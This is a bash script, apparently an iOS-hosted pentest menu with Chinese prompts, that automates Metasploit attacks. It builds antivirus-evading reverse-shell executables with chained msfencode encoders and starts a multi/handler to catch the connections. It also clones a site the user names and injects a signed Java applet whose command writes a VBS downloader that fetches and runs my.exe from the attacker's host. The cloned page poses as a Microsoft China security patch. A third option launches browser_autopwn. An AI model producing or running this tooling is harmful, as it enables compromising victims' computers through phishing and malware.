function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe 
}
break ;;
2) export enc=x86/call4_dword_xor
encnum
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe
}
break ;;
3) export enc=x86/countdown
encnum
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe
}
break ;;
4) export enc=x86/fnstenv_mov
encnum
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe
}
break ;;
5) export enc=x86/jmp_call_additive
encnum
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe
}
break ;;
6) export enc=x86/shikata_ga_nai
encnum
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe
}
break ;;
7) export enc=x86/unicode_mixed
encnum
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe
}
break ;;
8) export enc=x86/unicode_upper
encnum
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t exe -k $bin -e $enc -c $num > /var/www/file.exe
}
break ;;
9)
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t raw -e x86/shikata_ga_nai -c 3 | ./msfencode -t exe $bin -e x86/countdown -c 3 > /var/www/file.exe
}
break ;;
10)
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t raw -e x86/avoid_utf8_tolower -c 2 | ./msfencode -t exe $bin -e x86/shikata_ga_nai -c 3 > /var/www/file.exe
}
break ;;
11)
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t raw -e x86/jmp_call_additive -c 3 | ./msfencode -t exe $bin -e x86/countdown -c 3 > /var/www/file.exe
}
break ;;
12)
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t raw -e x86/call4_dword_xor -c 2 | ./msfencode -t raw -e x86/shikata_ga_nai -c 2 | ./msfencode -t exe $bin -e x86/countdown -c 3  > /var/www/file.exe
}
break ;;
13)
function cmd { ./msfpayload $payload 'LHOST'=$localhost_ip 'LPORT'=$port R | ./msfencode -t raw -e x86/avoid_utf8_tolower -c 2 | ./msfencode -t raw -e x86/shikata_ga_nai -c 3 | ./msfencode -t exe $bin -e x86/countdown -c 3 > /var/www/file.exe
}
break ;;
*) echo -e "\e[1;31m只能输入以上数字 [1-13]";
echo "回车继续. . ." ; read ;;
esac
done
}
function msf_start(){
echo -e "\e[1;31m[!] \e[1;33m正在启动Metasploit!!!  这将需要一段时间...";sleep 4;cd /var/mobile/pentest/inter/msfmod/;./sl;echo "";echo ""
cd $msfpath
echo "use multi/handler" >> /tmp/msf.rc
echo "set LHOST $localhost_ip" >> /tmp/msf.rc
echo "set LPORT $port" >> /tmp/msf.rc
echo "set PAYLOAD $payload" >> /tmp/msf.rc
echo "exploit" >> /tmp/msf.rc
./msfconsole -r /tmp/msf.rc
}
if [ -f "/tmp/msf.rc" ];then rm /tmp/msf.rc;fi
if [ -f "/var/mobile/pentest/inter/msf.rc" ];then rm /var/mobile/pentest/inter/msf.rc;fi
if [ -f "/var/mobile/pentest/inter/*.html" ];then rm /var/mobile/pentest/inter/*.html;fi
if [ -d "/var/www" ];then rm -rf /var/www ;fi
mkdir /var/www
echo -e "\e[1;34m"
echo "[1] Windows 反弹后门 "
echo "[2] Java Applet 攻击"
echo "[3] Browser Autopwn 攻击"
echo -e "\e[1;37m"
echo "【*】选择以上列表序列号"
read -p $tubiao msf_key
case $msf_key in
#这里调用以上函数
1) echo "";payload;echo " ";echo -e "\e[1;33m正在制作有效载荷.....  请稍等"
cmd;wait;chmod a+x /var/www/file.exe;echo "完成后门程序制作";msf_start ;;
2)  echo -e "\e[1;33m签署
该程序，需要克隆一个网页，注入一个安全的Java Applet，如果受害者访问克隆的网页，将会弹出提示，一旦受害者点击“运行”，主机将被感染。支持MAC OSX/Linux.\e[1;37m "
echo "<applet width='1' height='1' code='MSFcmd.class' archive='SignedMSFcmd.jar'>" > /var/www/index.html
echo "输入需要克隆的网址"
read -p ":" fakesite
if [ ! -z "$fakesite" ]; then export fakesite="$fakesite";elif [ -z "$fakesite" ];then echo "输入错误" ;sleep .5;continue;
echo -e "\e[1;33m[>] 正在克隆 $fakesite"
wget -ckq $fakesite
cat index.html >> /var/www/index.html
rm index.html
sleep .5
fi
echo -e "\e[1;33m[>] 注入Iframes标签..."
sleep .5
echo -e "\e[1;33m[>]完成！"
cp /var/mobile/pentest/inter/msfmod/java/MSFcmd.class /var/www
cp /var/mobile/pentest/inter/msfmod/java/SignedMSFcmd.jar /var/www
echo "<param name='first' value='cmd.exe /c echo Const adTypeBinary = 1 > \
C:\windows\apsou.vbs & echo Const adSaveCreateOverWrite = 2 >> C:\windows\apsou.vbs \
& echo Dim BinaryStream >> C:\windows\apsou.vbs & echo Set BinaryStream = CreateObject("ADODB.Stream") >> \
C:\windows\apsou.vbs & echo BinaryStream.Type = adTypeBinary >> C:\windows\apsou.vbs & \
echo BinaryStream.Open >> C:\windows\apsou.vbs & echo BinaryStream.Write BinaryGetURL(Wscript.Arguments(0)) >> \
C:\windows\apsou.vbs & echo BinaryStream.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite >> \
C:\windows\apsou.vbs & echo Function BinaryGetURL(URL) >> C:\windows\apsou.vbs & echo Dim Http >> \
C:\windows\apsou.vbs & echo Set Http = CreateObject("WinHttp.WinHttpRequest.5.1") >> C:\windows\apsou.vbs & \
echo Http.Open "GET", URL, False >> C:\windows\apsou.vbs & echo Http.Send >> C: windows\apsou.vbs & \
echo BinaryGetURL = Http.ResponseBody >> C:\windows\apsou.vbs & echo End Function >> C:\windows\apsou.vbs & \
echo Set shell = CreateObject("WScript.Shell") >> C:\windows\apsou.vbs & echo shell.Run "C:\windows\my.exe" >> \
C:\windows\apsou.vbs & start C:\windows\apsou.vbs http://$localhost_ip/my.exe C:\windows\my.exe'> </applet>" >> \
/var/www/index.html
echo "" >> /var/www/index.html
echo "网站安全检测..." >> /var/www/index.html
echo "你的浏览器存在漏洞，你需要接受并运行该修复补丁，这只需要一分钟的时间.
给您带来不便，我们非常抱歉！，——微软中国 " >> /var/www/index.html;sleep .5
echo -e "\e[1;33m正在制作有效载荷.....  请稍等";payload;cmd
cp /var/www/file.exe /var/www/my.exe
rm /var/www/file.exe
chmod a+x /var/www/my.exe
echo ""$localhost_ip" "$fakesite"" > /tmp/ipwnhost
msf_start ;;
#======================================================分割线=======================================#
3) echo -e "\e[1;33m使用browser_autopwn攻击存在的浏览器漏洞，使用\n本设备的IP地址作为一个恶意的Web服务器,\n需要手动在msf部署后使用dns欺骗到本机"
   echo "这需要一个很长的时间.."
#echo -e "\e[1;31m[!]\e[1;33m Lighttpd已经死亡!"
killall lighttpd >/dev/null 2>&1 &
cd $msfpath
echo "use server/browser_autopwn" >> /tmp/msf.rc
echo "set LHOST $localhost_ip" >> /tmp/msf.rc
echo "set SRVPORT 80" >> /tmp/msf.rc
echo 'set URIPATH ""' >> /tmp/msf.rc
echo "run" >> /tmp/msf.rc
sleep .4
./msfconsole -r /tmp/msf.rc
 ;;
esac
}

pwninter 
